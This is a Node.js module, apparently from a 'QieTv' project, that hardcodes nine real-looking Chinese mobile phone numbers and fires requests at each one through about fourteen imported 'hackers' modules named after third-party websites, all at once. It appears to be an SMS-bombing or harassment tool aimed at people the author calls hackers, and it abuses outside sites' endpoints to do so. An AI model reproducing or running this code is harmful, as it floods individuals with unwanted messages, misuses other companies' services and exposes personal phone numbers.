/*
 * Copyright (c) QieTv, Inc. 2018
 * @Author: idzeir
 * @Date: 2023-08-18 11:39:42
 * @Last Modified by: idzeir
 * @Last Modified time: 2023-09-27 10:28:40
 */
const log = (results) => {
    console.debug(results.map(({ value }) => value));
    // util.log(
    //     "Fuck Hacker Excuted:",
    //     results.map(({ value: { code, name, mobile } }) => `${name}-[${mobile}]-(${code === 200 ? "√" : "×"})`)
    // );
};

module.exports = async function hackFucker() {
    const mdfuckers = [
        ...new Set([
            "18610831322",
            "13716423199",
            "13901039606",
            "13681249122",
            "15711042492",
            "13681119519",
            "13901087463",
            "13261445004",
            "13146451391",
        ]),
    ];
    // console.log("fucked phone:", mdfuckers);
    const services = [
        require("./hackers/xwhdw"),
        require("./hackers/noisend"),
        require("./hackers/gxsbzx"),
        require("./hackers/4399"),
        // require("./hackers/csdn"),
        require("./hackers/yanxingjia"),
        require("./hackers/whweidu"),
        require("./hackers/chuangcache"),
        require("./hackers/dh001"),
        require("./hackers/js-r"),
        require("./hackers/cailiaoren"),
        require("./hackers/ftlib"),
        require("./hackers/majorbio"),
        require("./hackers/zhtzmls"),
        require("./hackers/gmyyun"),
    ];
    const result = await Promise.allSettled(
        services
            .map((service) => {
                return mdfuckers.map((fucker) => service(fucker));
            })
            .flat()
    );

    log(result);
};
